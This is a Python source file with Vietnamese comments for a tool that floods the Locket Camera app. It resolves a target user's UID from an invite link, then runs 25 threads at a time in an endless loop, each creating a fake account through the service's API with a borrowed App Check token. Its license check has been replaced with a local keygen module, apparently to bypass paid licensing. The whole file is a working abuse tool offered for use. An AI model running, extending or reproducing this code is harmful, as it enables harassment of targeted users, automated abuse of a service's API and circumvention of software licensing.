# spammer.py
# Nội dung của spammer.py gần như giữ nguyên, chỉ có một thay đổi nhỏ
# trong hàm validate_license. Bạn có thể chỉ sửa hàm đó hoặc thay cả file.
import requests
import re
import random
import string
import threading
import time
from typing import Optional, Callable
from urllib.parse import urlparse
from keygen import validate_key as validate_license_from_file

class SpamManager:
    def __init__(self):
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.REQUEST_TIMEOUT = 15
        self.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not self.FIREBASE_APP_CHECK_TOKEN: print("CRITICAL: Không thể lấy App Check Token.")
        self.active_spam_sessions = {}
        self.last_error_message = ""
    def _fetch_app_check_token(self):
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=self.REQUEST_TIMEOUT)
            return res.json().get("data", {}).get("token") if res.status_code == 200 else None
        except requests.RequestException: return None
    def validate_license(self, key: str) -> dict:
        """Sửa lại để trả về thông tin key khi hợp lệ"""
        print(f"--- [LOCAL_VALIDATION] Xác thực key '{key}'... ---")
        result = validate_license_from_file(key) # Hàm này đã được sửa trong keygen.py
        print(f"--- [LOCAL_VALIDATION] Kết quả: {result['code']}")
        return result
    def find_locket_uid(self, user_input: str) -> Optional[str]:
        user_input = user_input.strip()
        url_to_check = f"https://locket.cam/{user_input}" if not re.match(r'^https?://', user_input) else user_input
        self.last_error_message = ""
        try:
            final_url = requests.get(url_to_check, allow_redirects=True, timeout=self.REQUEST_TIMEOUT).url
            if final_url:
                match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
                if match: return match.group(1)
                self.last_error_message = f"Không tìm thấy UID trong URL cuối: {final_url}"
                return None
            return None
        except requests.RequestException as e:
            self.last_error_message = f"Lỗi kết nối khi lấy URL cuối: {e}"
            return None
    def _run_single_spam_thread(self, target_uid, stop_event, stats):
        if not self.FIREBASE_APP_CHECK_TOKEN: stats['failed'] += 1; return
        try:
            headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.FIREBASE_APP_CHECK_TOKEN}
            email = f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=15))}@thanhdieu.com"
            password = 'zlocket' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=7))
            payload = {"data": {"email": email, "password": password, "client_email_verif": True, "platform": "ios"}}
            res = requests.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            if stop_event.is_set(): return
            if res.status_code == 200: stats['success'] += 1
            else: stats['failed'] += 1
        except:
            if not stop_event.is_set(): stats['failed'] += 1
    def start_spam_session(self, user_id: int, target: str, update_callback: Callable):
        target_uid = self.find_locket_uid(target)
        if not target_uid:
            error_msg = f"Không thể tìm thấy Locket UID từ `{target}`." + (f"\nLý do: `{self.last_error_message}`" if self.last_error_message else "")
            update_callback(status="error", message=error_msg)
            return
        if user_id in self.active_spam_sessions: update_callback(status="error", message="Bạn đã có một phiên spam đang chạy."); return
        stop_event = threading.Event(); self.active_spam_sessions[user_id] = stop_event
        stats = {'success': 0, 'failed': 0, 'start_time': time.time()}
        def spam_loop():
            last_update = time.time()
            while not stop_event.is_set():
                threads = [threading.Thread(target=self._run_single_spam_thread, args=(target_uid, stop_event, stats)) for _ in range(25)]
                for t in threads: t.start()
                for t in threads: t.join()
                if time.time() - last_update > 5:
                    update_callback(status="running", stats=stats)
                    last_update = time.time()
            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions: del self.active_spam_sessions[user_id]
        session_thread = threading.Thread(target=spam_loop); session_thread.daemon = True; session_thread.start()
        update_callback(status="started", message=f"✅ Đã bắt đầu phiên spam tới target UID: `{target_uid}`.")
    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions: self.active_spam_sessions[user_id].set(); return True
        return False
